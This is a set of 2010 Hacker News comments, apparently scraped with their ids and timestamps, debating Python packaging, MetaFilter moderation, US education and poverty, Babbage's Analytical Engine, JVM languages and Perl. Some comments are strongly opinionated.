Compiling python is of course possible, although quite a chore if all you want is to configure some software.<p>Concerning the need to obtain a new python if you want to use a newer python: yes, it is more or less evident, but that's Zed Shaw's point, not mine. Where he has a point IMO is about the brokenness of the installed python - many distributions make too many changes w.r.t. upstream without understanding the consequences. To distro's defend, the python packaging solutions are so poorly thought out that python itself is not helping the situation.",1285077575

1712583,comment,1711995,1712285,0,0,joshmillard,,,"Heya, I'm one of the other two mods at mefi, along with Matt Haughey and Jessamyn West.  I go by ""cortex"" over there.<p><i>A saner way to do this will be to trust people to do the right thing, but verify that they are not doing anything malicious.</i><p>Absolutely.  And Mefi's definitely been of a size for a long while now where trust-but-verify has been an essential part of keeping it working.  Our approach these days is pretty much the same as Matt's approach years back when it was just him running the place: welcome people in with the benefit of the doubt but keep an eye out for trouble -- whether of the malicious or the clueless variety.<p>And we see both: keeping spam in check (even after the $5 speedbump) is a daily project, though thankfully not a high-volume one (we probably ban a couple of spammers/linkfarmers/astroturfers/SEO-marketers a week), and we're daily working with new users who are varyingly conspicuously not getting how the place works or what it's for or what the local tone and community expectations are.<p>One nice thing is that we've been able to take long experience with dealing with spammy behavior in particular and use that to build a pretty decent local toolset to keep a close eye on problem areas with a minimum of effort, so what spam does actually try to manifest these days tends to get spotted and nixed with quick turnaround.  Which by itself is good news but doesn't say anything directly about the community, but the implication is important: because we can get on top of one of the major sorts of bad behavior very responsively, it leaves us free to continue to let everybody else on the site have the sort of general community freedom that Matt talks about in those guidelines re: trust.  Because our small administrative team can effectively and promptly corral the problems that do occur, we don't have to clamp down on the basic posting and commenting rights of the vast majority of users acting in good faith.",1285077527

I claim this is all crap.<p>The same problem exists in almost any non-manufacturing job; certainly in the field of software development. We've got piles of bad metrics, like KLOCs (about which, the less said the better). We could count bugs, but different systems are prone to different levels of bugginess, and when we're all teaming up, it's not necessarily practical (let alone advisable) to ""blame"" someone. Yet by and large, we do a pretty good job of determining who are really good, and who aren't.<p>You mention that the standards themselves are, in some cases, bad. That may be true, but you should be trying to get out of such a district ASAP. The fact that they can't get good teachers, and the fact that the parents are hammering on the door because the kids aren't learning, should force change -- but for the fact that the system now gives parents no alternative.<p>It seems like the teachers' unions are hanging onto a fig leaf of rationalizating, but it's really a case of the perfect being the enemy of the good. We <i>could</i> do a lot better than we are, but we're not allowed to go that far because it may fall somewhat short of perfect.<p>But look at the bigger picture. What's a more serious failure: (a) not giving a teach a raise quite commensurate with what he/she deserves; or (b) not educating a whole classroom full of kids because they're stuck with a lousy teacher?",1285077424

1712562,comment,1711470,1711470,0,0,Untitled,,,"<rant><p>This article irritates the living hell out of me. I was extremely poor as a child, yet there are sensible ways people act who are in poverty and ways in which poor people act that causes poverty.<p>> Because personal responsibility should not be the sole purview of single minority mothers.<p>The popular idea (in the USA at least) is that once a person is a “single mother” they are somehow special and everyone has to pay their way. Popular politicians (Hillary Clinton) say things like “it takes the village to raise a child”. This is against the normal notion of the father and mother paying for the child and raising the child. Most single mothers probably do not know the father of their children.<p>This is utter bullshit - a poor (and rich girl) is not supposed to get pregnant out of wedlock – that is insane stupidity. This has nothing to do with poverty. Getting pregnant does not entitle you to a big chunk of another’s money.<p>> Being poor is going to the restroom before you get in the school lunch line so your friends will be ahead of you and won't hear you say ""I get free lunch"" when you get to the cashier....<p>Nice. I didn’t get lunch at school.<p>> Being poor is feeling the glued soles tear off your supermarket shoes when you run around the playground.<p>Hmm… fair enough. I only wore shoes since 8th grade (because it was mandatory). In any case, running around barefoot makes you faster (almost everyone did that). Gluing is a bad way to fix shoes – the better way is with a thick type of needle and twine (don’t exactly know what this is in English).<p>> Being poor is relying on people who don't give a damn about you.<p>I never had a problem with people not caring about me. Of course you will not be the most popular guy with the girls or have fancy clothes (you know that group). But that doesn’t mean that people do not care about you.<p>> Being poor is not talking to that girl because she'll probably just laugh at your clothes.<p>Or having extremely bad acne+teeth but no money for medicine? Been there. Still doesn’t entitle you to someone else’s money.<p>> Being poor is your kid's teacher assuming you don't have any books in your home.<p>You know what many teachers like? People who do well and work hard. All the money of rich kids cannot (usually) buy them good test scores. Fair enough, they have fancy scientific calculators and computers while you must do with a hand-hand-hand me down. But that doesn’t help them that much. More often the privilege that rich kids experience set them up for failure later in life.<p>Here is what I have found with parents that are different:\n1.	Became super conservative – everything is saved, nothing is wasted. Even now, when my parents are doing well, my father still can’t throw away glass bottles.\n2.	Obsession with cleanliness (my mother used to say: “We may be poor, but we are not dirty”).\n3.	Obsession with education and forcing children to work extremely hard. \n4.	Extremely socially conservative. My father forbade dancing, alcohol. Even forbade my sister from watching television soaps, etc…\n5.	Extremely strict.\n6.	Obsessed with being successful. My father has a successful business now, but still work 15 hours a day.<p><\rant>",1285077143

For the fellow Ontarians in the virtual room, I'm talking about Mike Harris.<p>For those who want to follow my deconstruction at home, I'm going to refer to the original report[1] and the detailed findings[2] that the original poster pointed to but with live links.<p>[1] The Economic Impact of the Achievement Gap in America’s Schools Summary of Findings April 2009 <a href=""http://www.mckinsey.com/app_media/images/page_images/offices/socialsector/pdf/achievement_gap_report.pdf"" rel=""nofollow"">http://www.mckinsey.com/app_media/images/page_images/offices...</a><p>[2] Detailed findings on the economic impact of the achievement gap in America's schools April 2009 <a href=""http://www.mckinsey.com/App_Media/Images/Page_Images/Offices/SocialSector/PDF/detailed_achievement_gap_findings.pdf"" rel=""nofollow"">http://www.mckinsey.com/App_Media/Images/Page_Images/Offices...</a>.<p>Let's start with a couple of points that go to history. Fifteen years ago (not too long before I emigrated), Mike Harris was elected in Ontario and started on a massive program of social change from which Ontario has yet to recover. His schools program changes weren't <i>all</i> bad, but could have been achieved much less confrontationally and more smoothly, and could have been done without harming the quality programs that existed before. The basis for all of the changes was rooted in a politicized interpretation of test results that weren't meant for such comparisons by the people who put those tests together (at the time, it was largely TIMSS as the driver).<p>TIMSS is the ""Trends in International Mathematics and Science Study"" (<a href=""http://timss.org/"" rel=""nofollow"">http://timss.org/</a>), and at the time, the results were interpreted by the Harris government to show that Canadian students (and most especially Ontario students) were performing badly. One problem: TIMSS was supposed to be a universal student study (that is, all students at the grade level in the school system were supposed to be taking it regardless of ability); some of the investigated countries[3] did selected populations (that is, they excluded their worst students) instead of universal.<p>[3] My recollection is that the above criticisms were laid against some of the PacRim countries and some of the former Soviet Bloc countries.<p>Canada, the U.S. and many other countries followed the rules and were subsequently ranked much lower than they would have been ranked otherwise (they still would have been middling-to-low ranking, but not as low as they were). The charges of population homogeneity that you make were also made in Canada at the time (""of course our diverse kids didn't do as well as the uniform kids in Korea"").<p>This last makes one of your conclusions nonsense:<p>""Then the main reason for the low average US ranking is that the US is a diverse country and the other countries are homogeneous.""<p>Canada isn't homogeneous and ranked 5th in science and 3rd in math on the PISA tests (page 4 of the detailed findings); New Zealand and Australia (both also immigrant countries) exhibited good results. The United Kingdom (a diverse country that has some immigration) exhibited average results. It's also worth noting (page 7) that Canada's performance declined by 5 points between 2003 and 2006; the U.S. declined by 9 points in the same period. (Most countries, in fact, declined, with France dropping by <i>15</i> and clustering around the U.K. for overall performance.)<p>It's also worth noting that the statements on page 8 essentially assume that only the U.S. has changed (e.g., it ignores the efforts that other countries have put into improving and focusses solely on the U.S. lag).<p>The ethnic make-up of Canada is similar to that of the U.S. as we're both immigrant countries. This isn't about race or diversity. It's about socioeconomic disadvantage (sorry, but it's true). Those two things tend to be highly correlated in the U.S. (and to some degree in Canada, too), but school funding in Canada is much more uniform than it is in the U.S. so that socioeconomic differences are smoothed out but not eliminated. See pages 12-13 of the detailed document.<p>You choose to focus on the ethnic achievement gaps pointed out by McKinsey, but <i>they don't stop there</i> and go on to point out the income achievement gap. Look at pages 42-45 for how this works. Compare the chart on page 26 (a 3 - 8 times difference in low achievement by race) with that on 43 (a 4 - 6 times difference in low achievement by income). There's strong correlation there.<p>The entire report is worth reading, not just the bit that you quoted or that I quoted.<p>You're right, though:<p>""This time the cause is bad teachers protected by the teachers union. I'm all for busting up the teachers union, but I don't for a nano second believe that bad teachers are really the cause of what is being observed.""<p>The problem is a bad system, not bad teachers (although they exist and should be removed from the system). The problem is local funding that isn't smoothed out so that students with all of the advantages get even more advantages because their schools can afford more and better equipment on the same tax rates. The problem is an over-reliance on quantization of the problem space, when students aren't cogs but are individuals (and if you place performance bonuses, etc. on classroom performance of a test, you get ""teaching to the test"", not learning). The problem is hunger (hungry children cannot study as well as those who aren't).<p>There are things to be fixed with how teachers and teachers unions work, certainly, but they should be done with a deeper understanding and NOT by misunderstanding what we do know.<p>A couple of other points:<p>""Is there any question how the US Blacks would do against, say, Ghana, Liberia, Nigeria, Kenya, Uganda, Zaire, Zimbabwe?""<p>One might be surprised. I don't know of any particular test for this, but at least some of the countries you named (and other countries in sub-Saharan Africa) might outperform U.S. blacks; they will, at the very least, be better than your off-hand comment suggests.<p>""So wonder how US students of Finish descent would do against Finland, Asian descent, against Hong Kong, Canadian descent, against Canada, Japanese descent, against Japan, Australian descent, against Australia? The study didn't say. Ah, wonder why? Why oh why? Maybe they followed the old rule, ""If you don't think you will like the answer, then don't ask the question."".<p>""So the study mostly tried to obscure the obvious cause: For the data they considered, the main cause of good performance is country of origin. Right: In particular, parents are a still more important cause, and it might be possible to dig still deeper.""<p>Um, no. The study <i>does</i> say, after a fashion. Your comment is a little nonsensical, though, because you're simply taking the top countries on the first couple of pages and applying them as ethnicities. As I noted at the top, both Canada and Australia are immigrant countries with broad ethnic diversity (but a strong English/WASP contingent, just like the U.S.).<p>The rest of your comment is nonsense that's easily covered by the summary McKinsey did and the original data (see page 8 of the detailed report for a sample about post-secondary education). Home schooling is mostly a disaster (home schoolers in the U.S. on average perform worse than public school children on all subjects; this may partially be because most home schoolers in the U.S. are nutty Christians who don't want their children to be able to think critically).<p>What your prescription for education will do is pretty much put the U.S. results 100% in the toilet, as it ensures that only those people with money will have access to education. Education is not a simple subject, and the libertarian approach will fail--and has already (it's why we <i>have</i> public schooling and that the majority of economic growth has happened since public schooling started).",1285075419

What fun is a virtual steam-powered computer? You can't scald anyone with <i>that</i>!<p>On the other hand, yes, in the year 2010 you really should master the art of building the virtual Analytical Engine before you go for the real thing. One reason, I believe, is that the current draft of the design of the Analytical Engine is more akin to the world's largest collection of back-of-the-envelope sketches than to a finished blueprint. There was never one canonical design for the Engine, because so little of it was ever actually realized in hardware. Babbage had a lot of fun swapping parts in and out in his imagination.<p>So there needs to be a bit of each approach. Build the virtual version first, in an environment where building 1024 identical custom-machined ratchets and pawls is just a matter of ten copy-and-pastes. Then a nail down a plan for what you intend to realize in hardware. And <i>then</i> build it. If you can find the money.<p>There will also have to be some back-and-forth. One of the central lessons of engineering is that it's more than just CAD. It isn't until you try to build a thing that you fully understand its design, if only because it is difficult to imagine the constraints that reality imposes on your design -- and, more embarrassingly, that the earlier parts of your construction impose on the later parts -- until you've actually gotten into the middle of the job. This is one reason why these projects are so expensive: They are, in part, research projects.

My conclusion wasn't what I expected it to be when I started researching the topic. Read on to find my conclusion...<p>That seems ironic given the conclusion of the post.  The reasons for rejection of Clojure and Scala are respectively ""Clojure is too different fom Java"", and ""Scala is too powerful"".<p>It's almost comical how well this encapsulates Blub programming (<a href=""http://c2.com/cgi/wiki?BlubParadox"" rel=""nofollow"">http://c2.com/cgi/wiki?BlubParadox</a> ).  or more to the point, assumptions about blub programmers by the author, who clearly at least understands programming languages.<p>The thing about this is, I don't see why we have to replace Java.  The power of the JVM is that there need not be One True Language To Rule Them All.<p>Let people program in Clojure or Scala or JavaScript or Ruby.  Design sensible interfaces for data interchange, and let people get on with their lives (and promote Polyglotism!).<p>Searching for the Next Big JVM Language is like searching for the next Facebook.  Sure there are going to be new popular entrants, but the ecosystem is such that there will never be another Java, just the same way there won't be another Facebook.<p>Change is hard, and it challenges lazy thinking in blog posts like this.",1285074968

Perl is a more mature platform than Python, and backwards compatibility is taken more seriously. The latest Perl 5.12 release can still run most of the test suite for Perl 1 released back in 1987.<p>That and its wide availability and portability make it a much better target than Python for something like glue in a build system for a project that's mostly in C anyway.<p>But even though it's backwards compatible with old code it's still somewhat of a pain to write code that works on old releases that don't have the modules / core features you want.<p>Backwards compatibility also comes at a price. Many of the changes that broke old Python code broke it because old warts were being fixed in Python. There's a lot of equivalent old warts in Perl that haven't been fixed, and there's no plan for doing so (other than Perl 6).",1285074767
